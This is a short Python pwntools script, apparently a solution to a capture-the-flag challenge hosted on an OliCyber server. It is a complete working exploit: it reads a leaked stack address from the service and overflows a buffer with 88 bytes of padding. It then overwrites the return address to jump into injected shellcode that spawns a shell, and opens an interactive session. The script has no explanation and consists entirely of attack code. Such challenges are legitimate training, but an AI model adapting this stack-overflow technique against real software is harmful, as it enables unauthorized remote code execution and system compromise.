from pwn import *

context.arch = 'amd64'

p = remote('vault.challs.olicyber.it', 10006)

p.sendlineafter(b'>' , b'1')
p.sendlineafter(b'messaggio:', b'asd')
p.recvuntil(b'in ')

ret = int(p.recvuntil(b'!')[:-1], 16) + 88 + 8
info(hex(ret))

p.sendlineafter(b'>', b'1')

payl = flat(
    b'A'*88,
    p64(ret),
    asm(shellcraft.sh())
)

p.sendlineafter(b'messaggio:', payl)
p.sendlineafter(b'>', b'3')

p.interactive()